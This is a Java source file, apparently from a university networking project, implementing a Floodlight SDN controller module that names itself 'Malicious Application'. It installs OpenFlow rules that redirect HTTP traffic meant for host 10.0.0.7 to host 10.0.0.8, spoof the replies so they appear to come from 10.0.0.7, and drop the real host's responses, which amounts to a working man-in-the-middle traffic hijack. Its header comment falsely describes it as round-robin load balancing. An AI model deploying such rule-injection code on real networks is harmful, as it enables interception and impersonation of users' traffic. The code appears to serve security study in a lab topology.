package edu.wisc.cs.project.subvert;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Iterator;
import java.util.Map;

import net.floodlightcontroller.core.FloodlightContext;
import net.floodlightcontroller.core.IFloodlightProviderService;
import net.floodlightcontroller.core.IOFMessageListener;
import net.floodlightcontroller.core.IOFSwitch;
import net.floodlightcontroller.core.IOFSwitchListener;
import net.floodlightcontroller.core.module.FloodlightModuleContext;
import net.floodlightcontroller.core.module.FloodlightModuleException;
import net.floodlightcontroller.core.module.IFloodlightModule;
import net.floodlightcontroller.core.module.IFloodlightService;
import net.floodlightcontroller.devicemanager.IDevice;
import net.floodlightcontroller.devicemanager.IDeviceService;
import net.floodlightcontroller.devicemanager.SwitchPort;
import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryService;
import net.floodlightcontroller.linkdiscovery.LinkInfo;
import net.floodlightcontroller.packet.Ethernet;
import net.floodlightcontroller.packet.IPv4;
import net.floodlightcontroller.routing.Link;

import org.openflow.protocol.OFFlowMod;
import org.openflow.protocol.OFMatch;
import org.openflow.protocol.OFMessage;
import org.openflow.protocol.OFPacketIn;
import org.openflow.protocol.OFPacketOut;
import org.openflow.protocol.OFPort;
import org.openflow.protocol.OFType;
import org.openflow.protocol.action.OFAction;
import org.openflow.protocol.action.OFActionDataLayerDestination;
import org.openflow.protocol.action.OFActionDataLayerSource;
import org.openflow.protocol.action.OFActionNetworkLayerDestination;
import org.openflow.protocol.action.OFActionNetworkLayerSource;
import org.openflow.protocol.action.OFActionOutput;
import org.openflow.util.U16;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Module to perform round-robin load balancing.
 * 
 */
public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitchListener {

	// Interface to Floodlight core for interacting with connected switches
	protected IFloodlightProviderService floodlightProvider;
	
	// Interface to link discovery service
	protected ILinkDiscoveryService linkDiscoveryProvider;
	
	// Interface to device manager service
	protected IDeviceService deviceProvider;
	
	// Interface to the logging system
	protected static Logger logger;
	
	private boolean ruleInstalled = false;
	
	// TODO Create list of servers to which traffic should be balanced
	
	/**
	 * Provides an identifier for our OFMessage listener.
	 * Important to override!
	 * */
	@Override
	public String getName() {
		return "Malicious Application";
	}

	@Override
	public boolean isCallbackOrderingPrereq(OFType type, String name) {
		// Auto-generated method stub
		return false;
	}

	@Override
	public boolean isCallbackOrderingPostreq(OFType type, String name) {
		// Auto-generated method stub
		return false;
	}

	@Override
	public Collection<Class<? extends IFloodlightService>> getModuleServices() {
		// Auto-generated method stub
		return null;
	}

	@Override
	public Map<Class<? extends IFloodlightService>, IFloodlightService> getServiceImpls() {
		// Auto-generated method stub
		return null;
	}

	/**
	 * Tells the module loading system which modules we depend on.
	 * Important to override! 
	 */
	@Override
	public Collection<Class<? extends IFloodlightService>> getModuleDependencies() {
		Collection<Class<? extends IFloodlightService >> floodlightService = 
			new ArrayList<Class<? extends IFloodlightService>>();
		floodlightService.add(IFloodlightProviderService.class);
		floodlightService.add(ILinkDiscoveryService.class);
		floodlightService.add(IDeviceService.class);
		return floodlightService;
	}

	/**
	 * Loads dependencies and initializes data structures.
	 * Important to override! 
	 */
	@Override
	public void init(FloodlightModuleContext context)
			throws FloodlightModuleException {
		floodlightProvider = context.getServiceImpl(IFloodlightProviderService.class);
		linkDiscoveryProvider = context.getServiceImpl(ILinkDiscoveryService.class);
		deviceProvider = context.getServiceImpl(IDeviceService.class);
		logger = LoggerFactory.getLogger(Subvert.class);
	}

	/**
	 * Tells the Floodlight core we are interested in PACKET_IN messages.
	 * Important to override! 
	 * */
	@Override
	public void startUp(FloodlightModuleContext context) {
		floodlightProvider.addOFMessageListener(OFType.PACKET_IN, this);
		floodlightProvider.addOFSwitchListener(this);
	}
	
	/**
	 * Receives an OpenFlow message from the Floodlight core and initiates the appropriate control logic.
	 * Important to override!
	 */
	@Override
	public net.floodlightcontroller.core.IListener.Command receive(
			IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
		
		// We only care about packet-in messages
		if (msg.getType() != OFType.PACKET_IN) { 
			// Allow the next module to also process this OpenFlow message
		    return Command.CONTINUE;
		}
		OFPacketIn pi = (OFPacketIn)msg;
				
		// Parse the received packet		
        OFMatch match = new OFMatch();
        match.loadFromPacket(pi.getPacketData(), pi.getInPort());
        
		// We only care about IP packets
		if (match.getDataLayerType() != Ethernet.TYPE_IPv4) {
			// Allow the next module to also process this OpenFlow message
		    return Command.CONTINUE;
		}
				
		// Figure out if I'm connected to H8, if I am, then move forward
		// otherwise push the packet and return
        long dl_dst = Ethernet.toLong(Ethernet.toMACAddress("00:00:00:00:00:08"));
        int nw_dst = IPv4.toIPv4Address("10.0.0.8");
		
        // Find switch and port to which destination device is connected
        SwitchPort deviceAttachment = findDeviceAttachment(dl_dst, nw_dst);
        if (null == deviceAttachment) {
        	logger.debug("Can't find the switch!!!---------------------");
        	return Command.CONTINUE;
        	// TODO: Handle case where device is not known
        }
        
        if(sw.getId() != deviceAttachment.getSwitchDPID()){
        	// send this packet along unchanged
        	ArrayList<OFAction> action = new ArrayList<OFAction>();
        	OFActionOutput outputPort = new OFActionOutput((short)deviceAttachment.getPort());
        	action.add(outputPort);
        	pushPacket(sw, pi, action, (short)OFActionOutput.MINIMUM_LENGTH);
        	
        	// let another module process this packet as well
        	return Command.CONTINUE;
        }
		
		if(Arrays.equals(match.getDataLayerSource(), Ethernet.toMACAddress("00:00:00:00:00:01")) &&
				Arrays.equals(match.getDataLayerDestination(), Ethernet.toMACAddress("00:00:00:00:00:07")) &&
				match.getNetworkProtocol() == IPv4.PROTOCOL_TCP  &&
				match.getTransportDestination() == (short)80){
			
			remapH7toH8(sw, pi, (short)deviceAttachment.getPort());
			return Command.STOP;
		}
		return Command.STOP;
    }
	
	private void remapH7toH8(IOFSwitch sw, OFPacketIn pi, short outputPort){
		logger.debug("-----------REMAP THIS PACKET TO GO TO H8 INSTEAD OF H7--------------\n");
		
		if(!ruleInstalled){
			installRemapRule(sw, pi, outputPort);
			installReverseRule(sw);
			dropH7toH1on80(sw);
		}
		
		// Handle the packet that the controller got. This gets done subsequently by the rule in the flowtable
		
		ArrayList<OFAction> actions = new ArrayList<OFAction>();
		
		OFActionDataLayerDestination dlDst = new OFActionDataLayerDestination(Ethernet.toMACAddress("00:00:00:00:00:08"));
		actions.add(dlDst);
		
		OFActionNetworkLayerDestination nwDest = new OFActionNetworkLayerDestination(IPv4.toIPv4Address("10.0.0.8"));		
		actions.add(nwDest);
		
		OFActionOutput outputTo = new OFActionOutput(outputPort);
		actions.add(outputTo);
				
		pushPacket(sw, pi, actions, (short)(OFActionOutput.MINIMUM_LENGTH + OFActionNetworkLayerDestination.MINIMUM_LENGTH +
				OFActionDataLayerDestination.MINIMUM_LENGTH));
	}
	
	private void installRemapRule(IOFSwitch sw, OFPacketIn pi, short outputPort){
		ruleInstalled = true;
		
		logger.debug("INSTALLING REMAP RULE!");
		
		OFFlowMod rule = (OFFlowMod)floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD);
		rule.setType(OFType.FLOW_MOD);
		rule.setCommand(OFFlowMod.OFPFC_ADD);
		
		OFMatch match = new OFMatch();
		match.loadFromPacket(pi.getPacketData(), pi.getInPort());
		match.setWildcards(~(OFMatch.OFPFW_DL_SRC | OFMatch.OFPFW_DL_DST | OFMatch.OFPFW_DL_TYPE | OFMatch.OFPFW_NW_PROTO | OFMatch.OFPFW_TP_DST));
		match.setDataLayerType((short)0x0800);
		match.setDataLayerSource("00:00:00:00:00:01");
		match.setDataLayerDestination("00:00:00:00:00:07");
		match.setNetworkProtocol(IPv4.PROTOCOL_TCP);
		match.setTransportDestination((short)80);
		
		rule.setMatch(match);
		
		ArrayList<OFAction> actions = new ArrayList<OFAction>();
		OFActionDataLayerDestination dlDst = new OFActionDataLayerDestination(Ethernet.toMACAddress("00:00:00:00:00:08"));
		actions.add(dlDst);
		
		OFActionNetworkLayerDestination nwDest = new OFActionNetworkLayerDestination(IPv4.toIPv4Address("10.0.0.8"));		
		actions.add(nwDest);
		
		OFActionOutput outputTo = new OFActionOutput(outputPort);
		actions.add(outputTo);
		
		rule.setActions(actions);
		
		rule.setBufferId(OFPacketOut.BUFFER_ID_NONE);
	    rule.setIdleTimeout((short)0);
	    rule.setHardTimeout((short)0);
	    rule.setPriority((short)11000);
	    rule.setLength((short)(OFFlowMod.MINIMUM_LENGTH + OFActionOutput.MINIMUM_LENGTH + OFActionNetworkLayerDestination.MINIMUM_LENGTH +
				OFActionDataLayerDestination.MINIMUM_LENGTH));
		
		try {
			sw.write(rule, null);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			logger.debug("----COULD NOT WRITE REMAP RULE TO SWITCH WITH H8 CONNECTED TO IT");
		}	
	}
	
	private void installForwardingRule(){
		// rule for switches that are not connected to H8. This may not make sense....hold that thought
	}
	
	private void installReverseRule(IOFSwitch sw){
		ruleInstalled = true;
		
        long dl_dst = Ethernet.toLong(Ethernet.toMACAddress("00:00:00:00:00:01"));
        int nw_dst = IPv4.toIPv4Address("10.0.0.1");
		
        // Find switch and port to which destination device is connected
        SwitchPort deviceAttachment = findDeviceAttachment(dl_dst, nw_dst);
        if (null == deviceAttachment) {
        	logger.debug("Can't find the switch!!!---------------------");
        	return;
        	// TODO: Handle case where device is not known
        }
        short outputPort = (short)deviceAttachment.getPort();
        
        OFFlowMod rule = (OFFlowMod)floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD);
		rule.setType(OFType.FLOW_MOD);
	    rule.setCommand(OFFlowMod.OFPFC_ADD);
	    
	    OFMatch match = new OFMatch();
	    match.setWildcards(~(OFMatch.OFPFW_DL_SRC | OFMatch.OFPFW_DL_DST | OFMatch.OFPFW_DL_TYPE | OFMatch.OFPFW_NW_PROTO | OFMatch.OFPFW_TP_SRC));
	    match.setDataLayerType((short)0x0800);
	    match.setDataLayerSource("00:00:00:00:00:08");
	    match.setDataLayerDestination("00:00:00:00:00:01");
	    match.setNetworkProtocol(IPv4.PROTOCOL_TCP);
	    match.setTransportSource((short)80);
	    
	    rule.setMatch(match);
	    
	    ArrayList<OFAction> actions = new ArrayList<OFAction>();

	    OFActionDataLayerSource dlSrc = new OFActionDataLayerSource(Ethernet.toMACAddress("00:00:00:00:00:07"));
	    actions.add(dlSrc);
	    
	    OFActionNetworkLayerSource nwSrc = new OFActionNetworkLayerSource(IPv4.toIPv4Address("10.0.0.7"));
	    actions.add(nwSrc);
    
	    OFActionOutput outputTo = new OFActionOutput(outputPort);
	    actions.add(outputTo);
	    
	    rule.setActions(actions);
	    rule.setLength((short)(OFFlowMod.MINIMUM_LENGTH + OFActionOutput.MINIMUM_LENGTH + OFActionNetworkLayerSource.MINIMUM_LENGTH +
	    		OFActionDataLayerSource.MINIMUM_LENGTH));
	    
	    rule.setBufferId(OFPacketOut.BUFFER_ID_NONE);
	    rule.setIdleTimeout((short)0);
	    rule.setHardTimeout((short)0);
	    rule.setPriority((short)10000);
	    
	    try{
	    	sw.write(rule, null);
	    	sw.flush();
	    }catch(Exception e){
	    	logger.error("Could not send subversive static rule to the switch");
	    }
	}
	
	private void dropH7toH1on80(IOFSwitch sw){
	    OFFlowMod rule = (OFFlowMod)floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD);
	    rule.setType(OFType.FLOW_MOD);
	    rule.setCommand(OFFlowMod.OFPFC_ADD);
	        
	    OFMatch match = new OFMatch();
	    match.setWildcards(~(OFMatch.OFPFW_DL_TYPE | OFMatch.OFPFW_DL_SRC | OFMatch.OFPFW_DL_DST | OFMatch.OFPFW_NW_PROTO | OFMatch.OFPFW_TP_SRC));
	    match.setDataLayerType((short)0x0800);
	    match.setDataLayerSource("00:00:00:00:00:07");
	    match.setDataLayerDestination("00:00:00:00:00:01");
	    match.setNetworkProtocol(IPv4.PROTOCOL_TCP);
	    match.setTransportSource((short)80);
	    
	    rule.setMatch(match);
	    rule.setIdleTimeout((short)0);
	    rule.setHardTimeout((short)0);
	    rule.setBufferId(OFPacketOut.BUFFER_ID_NONE);
	    rule.setPriority((short)10000);
	    rule.setLength((short)OFFlowMod.MINIMUM_LENGTH);
	    
	    try{
	    	sw.write(rule, null);
	    	sw.flush();
	    }catch(Exception e){
	    	logger.error("Could not send drop packet rule in Firewall to switch");
	    }
	}
	
	/**
	 * Sends a packet out to the switch
	 */
	private void pushPacket(IOFSwitch sw, OFPacketIn pi, 
			ArrayList<OFAction> actions, short actionsLength) {
		
		// create an OFPacketOut for the pushed packet
        OFPacketOut po = (OFPacketOut) floodlightProvider.getOFMessageFactory()
                		.getMessage(OFType.PACKET_OUT);        
        
        // Update the inputPort and bufferID
        po.setInPort(pi.getInPort());
        po.setBufferId(pi.getBufferId());
                
        // Set the actions to apply for this packet		
		po.setActions(actions);
		po.setActionsLength(actionsLength);
		
	        
        // Set data if it is included in the packet in but buffer id is NONE
        if (pi.getBufferId() == OFPacketOut.BUFFER_ID_NONE) {
            byte[] packetData = pi.getPacketData();
            po.setLength(U16.t(OFPacketOut.MINIMUM_LENGTH
                    + po.getActionsLength() + packetData.length));
            po.setPacketData(packetData);
        } else {
            po.setLength(U16.t(OFPacketOut.MINIMUM_LENGTH
                    + po.getActionsLength()));
        }        
        
        logger.debug("Push packet to switch: " + po);
        
        // Push the packet to the switch
        try {
            sw.write(po, null);
        } catch (IOException e) {
            logger.error("failed to write packetOut: ", e);
        }
	}
	
	/**
	 * Finds the switch and port to which the destination device is connected.
	 */
	private SwitchPort findDeviceAttachment(long mac, int ip) {
		// Find device based on MAC address and IP address
		Iterator<? extends IDevice> deviceIterator = 
				deviceProvider.queryDevices(mac, null, null/*ip*/, null, null);
		
		// Select first matching device
		if (deviceIterator.hasNext()) {
			IDevice device = deviceIterator.next();
			
			// Get device attachment points
			SwitchPort[] deviceSwitchPorts = device.getAttachmentPoints();
			
			// Select first matching attachment point
			if (deviceSwitchPorts.length >= 1) {
				return deviceSwitchPorts[0];
			}
		}
		return null;
	}
	
	/**
	 * Print a list of all devices in the network.
	 */
	private void printDevices() {
		Collection<? extends IDevice> devices = deviceProvider.getAllDevices();
		Iterator<? extends IDevice> deviceIterator = devices.iterator();
		while (deviceIterator.hasNext()) {
			IDevice device = deviceIterator.next();
			logger.debug("MAC="+device.getMACAddressString());
		}
	}
	
	/**
	 * Print a list of all links in the network
	 */
	private void printLinks() {
		Map<Link,LinkInfo> links = linkDiscoveryProvider.getLinks();
		Iterator<Link> linkIterator = links.keySet().iterator();
		while(linkIterator.hasNext())
		{
			Link link = linkIterator.next();
			logger.debug("SrcSwitch="+link.getSrc()+" SrcPort="+link.getSrcPort()
					+", DstSwitch="+link.getDst()+", DstPort="+link.getDstPort());
		}
	}
	
	/**
	 * Print a list of all switches in the network.
	 */
	private void printSwitches() {
		Map<Long,IOFSwitch> switches = floodlightProvider.getSwitches();
		Iterator<IOFSwitch> switchIterator = switches.values().iterator();
		while(switchIterator.hasNext())
		{
			IOFSwitch sw = switchIterator.next();
			logger.debug("SwitchId="+sw.getId());
		}
	}

	@Override
	public void addedSwitch(IOFSwitch sw) {
		//logger.debug("------------------NEW SWITCH ADDED, IN SUBVERT---------------");
		puntToController(sw);
		
	}

	@Override
	public void removedSwitch(IOFSwitch sw) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void switchPortChanged(Long switchId) {
		// TODO Auto-generated method stub
		
	}
	/**
	 * This function installs a rule so that all traffic destined for h7 port 80
	 * is send out to h8 port 80
	 * @param sw - switch to install the rule on
	 */
	
	private void puntToController(IOFSwitch sw){
		logger.debug("\nMalicious application inserting flow to punt all traffic to controller\n");
		
		OFFlowMod rule = (OFFlowMod)floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD);
		rule.setType(OFType.FLOW_MOD);
	    rule.setCommand(OFFlowMod.OFPFC_ADD);
	    
	    OFMatch match = new OFMatch();
	    match.setWildcards(~(OFMatch.OFPFW_DL_SRC | OFMatch.OFPFW_DL_DST | OFMatch.OFPFW_DL_TYPE | OFMatch.OFPFW_NW_PROTO | OFMatch.OFPFW_TP_DST));
	    match.setDataLayerType((short)0x0800);
	    match.setDataLayerSource("00:00:00:00:00:01");
	    match.setDataLayerDestination("00:00:00:00:00:07");
	    match.setNetworkProtocol(IPv4.PROTOCOL_TCP);
	    match.setTransportDestination((short)80);
	    
	    rule.setMatch(match);
	    
	    // set action to punt to the controller
	    ArrayList<OFAction> actions = new ArrayList<OFAction>();
    	OFAction outputTo = new OFActionOutput(OFPort.OFPP_CONTROLLER.getValue()); 
    	actions.add(outputTo);
    	rule.setActions(actions);
	    
	    rule.setBufferId(OFPacketOut.BUFFER_ID_NONE);
	    rule.setLength((short)(OFFlowMod.MINIMUM_LENGTH + OFActionOutput.MINIMUM_LENGTH));
	    rule.setIdleTimeout((short)0);
	    rule.setHardTimeout((short)0);
	    rule.setPriority((short)10000);
	    
	    try{
	    	sw.write(rule, null);
	    	sw.flush();
	    }catch(Exception e){
	    	logger.error("Could not send subversive static rule to the switch");
	    }
	}

}